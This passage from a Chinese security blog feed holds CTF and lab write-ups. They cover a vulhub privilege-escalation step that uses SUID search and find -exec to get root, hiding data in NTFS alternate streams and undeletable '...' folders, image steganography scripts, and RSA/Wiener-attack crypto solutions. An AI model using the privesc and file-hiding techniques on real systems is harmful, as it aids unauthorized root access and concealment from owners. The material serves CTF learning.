class="token function">file</span> or directoryfind: <span class="token variable">`</span></span>./proc/3917/task/3917/fdinfo/5<span class="token string">': No such file or directoryfind: <span class="token variable"><span class="token variable">`</span>./proc/3917/fd/5': No such <span class="token function">file</span> or directoryfind: <span class="token variable">`</span></span>./proc/3917/fdinfo/5'</span><span class="token builtin class-name">:</span> No such <span class="token function">file</span> or directory<span class="token comment">#查看所有txt的文件</span>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># find . -type f -name "*.txt"  </span>./1.txt./3.txt./2.txt<span class="token comment">#查找所有txt文件，把他们合并到一起</span>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># find . -type f -name "*.txt" -exec cat &#123;&#125; \;> all.txt</span>                                                                           ┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># ls</span><span class="token number">1</span>.txt  <span class="token number">2</span>.txt  <span class="token number">3</span>.txt  all.txt                                                                           ┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># cat all.txt</span><span class="token function">ls</span><span class="token function">cat</span><span class="token function">more</span><span class="token function">ls</span> -a<span class="token function">whoami</span><span class="token builtin class-name">echo</span> <span class="token string">"i am m0re"</span><span class="token builtin class-name">echo</span> <span class="token string">"lalala"</span><span class="token function">ls</span><span class="token function">ls</span><span class="token function">ls</span><span class="token function">clear</span><span class="token function">clear</span><span class="token function">clear</span><span class="token function">clear</span><span class="token function">clear</span><span class="token function">clear</span><span class="token function">clear</span><span class="token function">clear</span><span class="token function">whoami</span><span class="token function">whoami</span><span class="token function">whoami</span><span class="token function">whoami</span><span class="token function">whoami</span><span class="token function">whoami</span><span class="token function">whoami</span><span class="token function">whoami</span><span class="token comment">#创建一个test.sh的脚本文件</span>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># find 1.txt -exec ./test.sh &#123;&#125; \;</span><span class="token number">1</span>.txt  <span class="token number">2</span>.txt  <span class="token number">3</span>.txt  all.txt  test.sh<span class="token function">ls</span><span class="token function">cat</span><span class="token function">more</span><span class="token function">ls</span> -a<span class="token function">whoami</span><span class="token builtin class-name">echo</span> <span class="token string">"i am m0re"</span><span class="token builtin class-name">echo</span> <span class="token string">"lalala"</span></code></pre><p>使用find命令进行提权</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#使用find命令查看拥有suid权限的文件</span>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># find / -perm -u=s -type f 2>/dev/null</span>/usr/lib/openssh/ssh-keysign/usr/lib/xorg/Xorg.wrap/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/sbin/pppd/usr/sbin/mount.nfs/usr/sbin/mount.cifs/usr/bin/ntfs-3g/usr/bin/kismet_cap_nrf_51822/usr/bin/sudo/usr/bin/newgrp/usr/bin/kismet_cap_nxp_kw41z/usr/bin/kismet_cap_ti_cc_2531/usr/bin/kismet_cap_ti_cc_2540/usr/bin/pkexec/usr/bin/kismet_cap_linux_bluetooth/usr/bin/kismet_cap_linux_wifi/usr/bin/fusermount3/usr/bin/umount/usr/bin/gpasswd/usr/bin/chfn/usr/bin/kismet_cap_nrf_mousejack/usr/bin/mount/usr/bin/chsh/usr/bin/su/usr/bin/bwrap/usr/bin/kismet_cap_ubertooth_one/usr/bin/passwd/usr/libexec/polkit-agent-helper-1<span class="token comment">#使用exec查看当前用户</span>┌──<span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># find 1.txt -exec "whoami" \;                                       1 ⨯</span>rootfind的文件，必须是可以找到的文件名，不然会出错，可以看到是root权限</code></pre><p>提权<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606963332181-0c88580c-97d9-4810-8156-40256eddde1d.png#align=left&display=inline&height=106&margin=%5Bobject%20Object%5D&name=image.png&originHeight=106&originWidth=509&size=18340&status=done&style=none&width=509" alt="image.png" loading="lazy"><br />flag4.txt文件是有suid权限的。<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/2432392/1606963766924-61d6a2d7-e0a5-48d3-9a8d-ee30a96ee8b6.png#align=left&display=inline&height=159&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=728&size=56744&status=done&style=none&width=634" alt="image.png" loading="lazy"><br />可以在root目录下找到thefinalflag.txt</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># cat thefinalflag.txt</span>Well done<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>Hopefully you've enjoyed this and learned some new skills.You can <span class="token builtin class-name">let</span> me know what you thought of this little journeyby contacting me via Twitter - @DCAU7</code></pre><p>第一个实验到此结束。</p>]]></content>
      
      
      <categories>
          
          <category> vulhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTFS数据流隐写</title>
      <link href="/posts/66a3c59b/"/>
      <url>/posts/66a3c59b/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做题遇到了几个是NTFS数据流隐写的题目，感觉很有趣，就深入的学习一下。知识面较浅。</p><h2 id="什么是NTFS数据流？"><a href="#什么是NTFS数据流？" class="headerlink" title="什么是NTFS数据流？"></a>什么是NTFS数据流？</h2><blockquote><p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息。————百度百科</p></blockquote><blockquote><p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为“宿主文件：准备与宿主文件关联的数据流文件”。————百度百科</p></blockquote><h2 id="NTFS数据流隐藏文件的方法和实例"><a href="#NTFS数据流隐藏文件的方法和实例" class="headerlink" title="NTFS数据流隐藏文件的方法和实例"></a>NTFS数据流隐藏文件的方法和实例</h2><p>创建一个数据交换流文件的方法，命令为“宿主文件：准备与宿主文件关联的数据流文件”。<br>首先，分出一个很小的盘，来测试用。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201130193230-bb3fad2e-32ff-1.png" alt="m0re" loading="lazy"></p><h3 id="1-单文件流隐藏"><a href="#1-单文件流隐藏" class="headerlink" title="1.单文件流隐藏"></a>1.单文件流隐藏</h3><p>先在F盘中新建一个空的文本文件，命名为m0re.txt，<br>创建一个NTFS数据流，</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"i am a test"</span> <span class="token operator">></span> :m0re.txt</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201130194208-13e65af8-3301-1.png" alt="m0re" loading="lazy"><br>已经成功的隐藏信息，查看方式有两种<br>一种是使用windows自带的notepad查看，命令如下</p><pre class="language-bash" data-language="bash"><code class="language-bash">notepad :m0re.txt</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201130194429-67fb896a-3301-1.png" alt="m0re" loading="lazy"><br>第二种方法是使用工具，<code>lads.exe</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">lads.exe /S</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201130201326-72e9033a-3305-1.png" alt="m0re" loading="lazy"><br>扫描到这个文件存在NTFS数据流，然后用第一种方法显示出来。</p><h3 id="2-关联文件流"><a href="#2-关联文件流" class="headerlink" title="2.关联文件流"></a>2.关联文件流</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"https://m0re.top"</span> <span class="token operator">></span> lalala.txt:m0re.txt</code></pre><p>此时的m0re.txt是宿主文件，将信息内容隐藏到宿主文件中了，直接打开<code>lalala.txt:m0re.txt</code>查看数据流文件<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201130201544-c53ee4f6-3305-1.png" alt="m0re" loading="lazy"><br>这里需要注意的是这个不是将数据写入到文件中，而是创建了NTFS数据流，信息都在数据流当中。这个<code>lalala.txt:m0re.txt</code>就是创建的流文件。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201130200846-cc7d4e7a-3304-1.png" alt="m0re" loading="lazy"><br>当然不止可以隐藏文本数据，还可以隐藏其他的文件，比如exe可执行文件，pyc文件等<br>这里使用type命令，来隐藏文件。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">type</span> yincang.jpg <span class="token operator">></span>yincang.jpg:suzhu.jpg<span class="token comment">#隐藏图片到另一张图片中</span><span class="token comment">#查看方式使用windows自带的mspaint.exe</span>mspaint.exe yincang.jpg:suzhu.jpg</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201130203837-f80c6086-3308-1.png" alt="m0re" loading="lazy"><br>了解：windows系统隐藏文件夹和查看方法<br>隐藏：<code>attrib m0re +a +s +h</code><br>查看：<code>dir/a:h</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201130205924-decf1f34-330b-1.png" alt="m0re" loading="lazy"></p><h3 id="1-创建…文件夹"><a href="#1-创建…文件夹" class="headerlink" title="1.创建…文件夹"></a>1.创建…文件夹</h3><p>我们都知道，在windows系统中是无法创建以点命名的目录。所以一般是无法创建…的目录文件的。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span>.::<span class="token variable">$INDEX_ALLOCATION</span><span class="token function">mkdir</span> "<span class="token punctuation">..</span>.<span class="token punctuation">\</span><span class="token punctuation">..</span>.<span class="token punctuation">\</span>"</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201206145857.png" alt="m0re" loading="lazy"><br>怎么进入这个文件夹呢？在资源管理器中是进不去的。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201206150017.png" alt="m0re" loading="lazy"><br>无法仅使用名称进入文件夹(例如:<code>cd …</code>或<code>cd …\</code>或<code>cd …\…</code>不起作用)，必须使用<code>cd …\…\</code>的语法。进入文件夹之后可以在这个文件夹里创建文件。<br>在cmd中进入，使用命令进入，但是无法通过GUI(<code>explorer.exe</code>)进入，而且删除不了，无法进行删除操作。(PS:后悔了，早知道给虚拟机里实验了。55555)<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201206150521.png" alt="m0re" loading="lazy"></p><h2 id="CTF例题实战"><a href="#CTF例题实战" class="headerlink" title="CTF例题实战"></a>CTF例题实战</h2><p>找了几个NTFS流数据隐写的题目。</p><h3 id="ACTF新生赛2020-NTFS数据流"><a href="#ACTF新生赛2020-NTFS数据流" class="headerlink" title="[ACTF新生赛2020]NTFS数据流"></a>[ACTF新生赛2020]NTFS数据流</h3><p>题目来源——BUUCTF<br>wp不写了，就是那两个工具的使用，关键在于理解知识。<br>这个是使用NtfsStreamsEditor工具扫描。<br>有两点，需要注意<br>1.解压需要使用winrar解压软件。<br>2.需要在win7系统中进行搜索。</p><h3 id="猫片-安恒"><a href="#猫片-安恒" class="headerlink" title="猫片(安恒)"></a>猫片(安恒)</h3><p>这个题目在bugkuCTF的misc分类中。最后会使用工具就OK。</p><h3 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h3><p>题目来源——BUUCTF，最后有个步骤是NTFS隐写。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次学到几点冷知识，有所收获，NTFS隐写也掌握了基本的原理及应用。</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/2539">https://xz.aliyun.com/t/2539</a><br><a href="https://www.qingsword.com/qing/812.html">https://www.qingsword.com/qing/812.html</a><br><a href="https://tyrant-k.github.io/2020/06/24/%E7%A1%AC%E7%9B%98%E5%8F%96%E8%AF%81-%E5%88%9D%E6%8E%A2NTFS%E9%9A%90%E5%86%99/">https://tyrant-k.github.io/2020/06/24/%E7%A1%AC%E7%9B%98%E5%8F%96%E8%AF%81-%E5%88%9D%E6%8E%A2NTFS%E9%9A%90%E5%86%99/</a><br><a href="https://blog.csdn.net/alone_map/article/details/51851071">https://blog.csdn.net/alone_map/article/details/51851071</a><br><a href="https://www.cnblogs.com/liuzhenbo/p/10925120.html">https://www.cnblogs.com/liuzhenbo/p/10925120.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中的图片隐写</title>
      <link href="/posts/99bc7e1c/"/>
      <url>/posts/99bc7e1c/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>遇到个杂项的题目，没见过的类型，反思一下，拿到图片后，能想到的点太少，所以就写一下这个关于隐写的总结。</p><h2 id="pngcheck-zlib隐藏信息"><a href="#pngcheck-zlib隐藏信息" class="headerlink" title="pngcheck+zlib隐藏信息"></a>pngcheck+zlib隐藏信息</h2><h3 id="题目1—可乐加冰"><a href="#题目1—可乐加冰" class="headerlink" title="题目1—可乐加冰"></a>题目1—可乐加冰</h3><p>pngcheck安装的话在kali中使用</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> pngcheck  <span class="token comment">#非root加上sudo</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/DJp8x0.png" alt="m0re" loading="lazy"><br>使用工具pngcheck来看一下。<br><img src="https://gitee.com/m0re/picture/raw/master/img/DJpzzq.png" alt="m0re" loading="lazy"><br>正常的块的length是在65524的时候就满了，而倒数第二个IDAT块长度是44671，最后一个长度是73，很明显最后一个IDAT块是有问题的，因为他本来应该并入到倒数第二个未满的块里。<br>binwalk提取一下<br>得到两个zlib文件。以前的思路，zlib文件，里面没东西。不管了。<br>这次不一样，信息恰恰藏在zlib文件中。<br><img src="https://gitee.com/m0re/picture/raw/master/img/DJk1G4.png" alt="m0re" loading="lazy"><br>在windows中打开吧，四个文件，<br><img src="https://gitee.com/m0re/picture/raw/master/img/DJkJMR.png" alt="m0re" loading="lazy"><br>没有zlib后缀的就是zlib解压后的文件。<br>5B文件里 ，没有找到什么可疑的。反而在2AE96中看到<br><img src="https://gitee.com/m0re/picture/raw/master/img/DJkLwV.png" alt="m0re" loading="lazy"><br>十六进制的部分，没有A-F这类的也就是说，只有数字，很可能是10进制的数字。复制出来转一下字符串，注意是ascii码转字符串，将其空格替换成逗号进行批量转换。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">83,46</span>,36,36,36,95,43,83,46,36,95,95,36,43,83,46,95,95,95,43,83,46,95,95,36,43,83,46,36,36,36,36,43,83,46,36,36,36,95,43,83,46,36,95,95,36,43,83,46,95,95,36,43,34,45,34,43,83,46,36,95,36,36,43,83,46,36,95,36,95,43,83,46,36,36,95,36,43,83,46,36,36,95,43,34,45,34,43,83,46,36,95,95,43,83,46,36,95,36,95,43,83,46,36,36,36,36,43,83,46,36,36,36,43,34,45,34,43,83,46,36,95,95,36,43,83,46,36,95,95,36,43,83,46,36,36,95,43,83,46,95,36,36,43,34,45,34,43,83,46,36,36,95,36,43,83,46,36,95,36,95,43,83,46,36,36,95,36,43,83,46,36,95,95,95,43,83,46,95,95,36,43,83,46,95,36,95,43,83,46,36,36,36,36,43,83,46,36,95,36,43,83,46,36,36,95,43,83,46,95,36,95,43,83,46,36,95,95,43,83,46,36,36,95,36</code></pre><p>然后转换一下得到<br><img src="https://gitee.com/m0re/picture/raw/master/img/DJmOT1.png" alt="m0re" loading="lazy"><br>和JJencode编码很像<br><img src="https://gitee.com/m0re/picture/raw/master/img/DJnu6g.png" alt="m0re" loading="lazy"><br>于是将<code>S</code>替换成<code>$</code>再进行解码</p><pre class="language-bash" data-language="bash"><code class="language-bash">$.<span class="token variable">$$</span><span class="token variable">$_</span>+$.<span class="token variable">$__</span>$+$.___+$.__$+$.<span class="token variable">$$</span><span class="token variable">$$</span>+$.<span class="token variable">$$</span><span class="token variable">$_</span>+$.<span class="token variable">$__</span>$+$.__$+<span class="token string">"-"</span>+$.<span class="token variable">$_</span><span class="token variable">$$</span>+$.<span class="token variable">$_</span><span class="token variable">$_</span>+$.<span class="token variable">$$</span>_$+$.<span class="token variable">$$</span>_+<span class="token string">"-"</span>+$.<span class="token variable">$__</span>+$.<span class="token variable">$_</span><span class="token variable">$_</span>+$.<span class="token variable">$$</span><span class="token variable">$$</span>+$.<span class="token variable">$$</span>$+<span class="token string">"-"</span>+$.<span class="token variable">$__</span>$+$.<span class="token variable">$__</span>$+$.<span class="token variable">$$</span>_+$._<span class="token variable">$$</span>+<span class="token string">"-"</span>+$.<span class="token variable">$$</span>_$+$.<span class="token variable">$_</span><span class="token variable">$_</span>+$.<span class="token variable">$$</span>_$+$.<span class="token variable">$___</span>+$.__$+$._<span class="token variable">$_</span>+$.<span class="token variable">$$</span><span class="token variable">$$</span>+$.<span class="token variable">$_</span>$+$.<span class="token variable">$$</span>_+$._<span class="token variable">$_</span>+$.<span class="token variable">$__</span>+$.<span class="token variable">$$</span>_$</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/DJMZfx.png" alt="m0re" loading="lazy"></p><h3 id="题目2—未知"><a href="#题目2—未知" class="headerlink" title="题目2—未知"></a>题目2—未知</h3><p><img src="https://s3.ax1x.com/2020/11/23/DYWnqf.png" alt="m0re" loading="lazy"><br>这个也是<br><img src="https://gitee.com/m0re/picture/raw/master/img/DYfefJ.png" alt="m0re" loading="lazy"><br>然后直接提取就可以得到zlib文件了，binwalk提取出来是不需要解压缩包的，所以直接看到了文件中的二进制数字，全是<code>0</code>和<code>1</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/DNksud.png" alt="m0re" loading="lazy"><br>脚本画图，0作黑，1作白，得不到结果就反过来。尝试两遍就得到了。<br>脚本如下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> PIL<span class="token punctuation">.</span>ImageMAX <span class="token operator">=</span> <span class="token number">25</span>pic <span class="token operator">=</span> PIL<span class="token punctuation">.</span>Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>MAX<span class="token punctuation">,</span>MAX<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"1111111000100001101111111100000101110010110100000110111010100000000010111011011101001000000001011101101110101110110100101110110000010101011011010000011111111010101010101111111000000001011101110000000011010011000001010011101101111010101001000011100000000000101000000001001001101000100111001111011100111100001110111110001100101000110011100001010100011010001111010110000010100010110000011011101100100001110011100100001011111110100000000110101001000111101111111011100001101011011100000100001100110001111010111010001101001111100001011101011000111010011100101110100100111011011000110000010110001101000110001111111011010110111011011"</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>MAX<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                        pic<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span>y<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                i <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>pic<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>pic<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"flag.png"</span><span class="token punctuation">)</span></code></pre><p>扫描即可得到flag。</p><h2 id="文件头尾逆序"><a href="#文件头尾逆序" class="headerlink" title="文件头尾逆序"></a>文件头尾逆序</h2><p>所谓文件头尾逆序，就是将整个文件的十六进制序列整个颠倒过来，在CTFhub中找到了2018网鼎杯的原题，下面是图片。<br><img src="https://gitee.com/m0re/picture/raw/master/img/DNefXD.jpg" alt="m0re" loading="lazy"><br>在010editor中打开，发现最后的<br><img src="https://gitee.com/m0re/picture/raw/master/img/DNevng.png" alt="m0re" loading="lazy"><br>这就是png头反过来了，所以将其颠倒回来查看一下。<br>使用python进行处理。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token builtin">input</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.jpg'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>input_all <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>ss <span class="token operator">=</span> input_all<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>output <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'m0re.jpg'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token builtin">input</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>output<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>跑一下得到flag<br><img src="https://gitee.com/m0re/picture/raw/master/img/DNlUUg.png" alt="m0re" loading="lazy"><br>看的时候，注意细节。<br>后续遇到再补充…..mark一下先</p>]]></content>
      
      
      <categories>
          
          <category> 网安学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020UNCTF部分题目复现</title>
      <link href="/posts/c75f537d/"/>
      <url>/posts/c75f537d/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近比赛的题目，复现一下。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="unctf"><a href="#unctf" class="headerlink" title="unctf"></a>unctf</h2><p>web题目环境没有了，暂时无法复现(网站进不去了，等可以进去了再复现)</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="鞍山大法官开庭之缺的营养这一块怎么补"><a href="#鞍山大法官开庭之缺的营养这一块怎么补" class="headerlink" title="鞍山大法官开庭之缺的营养这一块怎么补"></a>鞍山大法官开庭之缺的营养这一块怎么补</h4><p><img src="https://s3.ax1x.com/2020/11/17/DePVnx.jpg" alt="m0re" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">ottttootoootooooottoootooottotootttootooottotttooootttototoottooootoooottotoottottooooooooottotootto</code></pre><p>培根密码，why？因为ot只有这两种字母，而且在说吃的。<br>放到在线网站解密<br>PEIGENHENYOUYINGYANG<br>所以flag是<code>unctf&#123;PEIGENHENYOUYINGYANG&#125;</code></p><h4 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h4><p>已知<code>a,b,e,c</code>然后还知道<code>a=p+q, b=p-q</code>脚本跑</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 <span class="token keyword">as</span> gp<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token number">22886015855857570934458119207589468036427819233100165358753348672429768179802313173980683835839060302192974676103009829680448391991795003347995943925826913190907148491842575401236879172753322166199945839038316446615621136778270903537132526524507377773094660056144412196579940619996180527179824934152320202452981537526759225006396924528945160807152512753988038894126566572241510883486584129614281936540861801302684550521904620303946721322791533756703992307396221043157633995229923356308284045440648542300161500649145193884889980827640680145641832152753769606803521928095124230843021310132841509181297101645567863161780</span>q <span class="token operator">=</span> <span class="token number">155422298738009940394189206134042119662513162560610248399569107132538620220590060772127789136918984458521940817304671619205395736161534795149599241668486283754795346411784845057685713557075371605135986388011998610261360520650827734187124699589734496097678970899686056997267797534053934064148348759788335157899</span>p <span class="token operator">=</span> <span class="token number">164976388739628973581511063883090363893890874421691770454048880284500992179926996908823840726558454111596699286948761026319434957217223527703429627592448959262532954019810985574583860227624287638908448719207441426500367172146028171043107126122608800640249201232870138119493156975216320985668013888561826953269</span>n <span class="token operator">=</span> p <span class="token operator">*</span> qphi <span class="token operator">=</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>e <span class="token operator">=</span> <span class="token number">65537</span>d <span class="token operator">=</span> gp<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long2str<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>flag为<code>UNCTF&#123;welcome_to_rsa&#125;</code></p><h4 id="简单的RSA"><a href="#简单的RSA" class="headerlink" title="简单的RSA"></a>简单的RSA</h4><p>只有一个txt文件，里面是<code>e,n,c</code>的值，e的值特别大，从大师傅那里收来的脚本。跑一下出结果</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">import</span> CTF<span class="token punctuation">.</span>RSA<span class="token punctuation">.</span>ContinuedFractions <span class="token keyword">as</span> ContinuedFractions<span class="token keyword">import</span> CTF<span class="token punctuation">.</span>RSA<span class="token punctuation">.</span>Arithmetic <span class="token keyword">as</span> Arithmetic<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">def</span> <span class="token function">wiener_hack</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span>    frac <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>rational_to_contfrac<span class="token punctuation">(</span>e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    convergents <span class="token operator">=</span> ContinuedFractions<span class="token punctuation">.</span>convergents_from_contfrac<span class="token punctuation">(</span>frac<span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>k<span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token keyword">in</span> convergents<span class="token punctuation">:</span>        <span class="token keyword">if</span> k <span class="token operator">!=</span> <span class="token number">0</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            phi <span class="token operator">=</span> <span class="token punctuation">(</span>e <span class="token operator">*</span> d <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> k            s <span class="token operator">=</span> n <span class="token operator">-</span> phi <span class="token operator">+</span> <span class="token number">1</span>            discr <span class="token operator">=</span> s <span class="token operator">*</span> s <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">*</span> n            <span class="token keyword">if</span> <span class="token punctuation">(</span>discr <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                t <span class="token operator">=</span> Arithmetic<span class="token punctuation">.</span>is_perfect_square<span class="token punctuation">(</span>discr<span 